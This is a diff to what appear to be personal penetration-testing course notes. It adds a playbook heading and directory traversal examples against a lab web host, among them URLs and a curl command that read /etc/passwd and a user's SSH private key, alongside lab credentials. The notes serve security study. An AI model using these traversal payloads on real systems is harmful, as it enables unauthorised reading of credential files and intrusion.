@@ -17,6 +17,7 @@
   - Credentials (🔒 username:Eric.Wallows, password:EricLikesRunning800)
   - Flag format: `OS{68c1a60008e872f3b525407de04e48a3}`
 
+## Methodology/Playbook
 ## 🛠️ Kali setup
 1. Register [Broadcom account](https://profile.broadcom.com/web/registration)
 1. Download "VMware Workstation Pro"
@@ -192,6 +193,10 @@
       - absolute path: `cat /home/kali/etc/passwd`  
       - relative path: `cat ../../etc/pwd`: move 2 directories back to root file
       - extra ../sequence: `cat ../../../../../../../../../../../etc/passwd`
+      - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`
+        The output of /etc/passwd shows a user called "offsec"
+      - `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
+      - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
     - File inclusion vulnerabilities
     - File upload vulnerabilities
     - Command injection
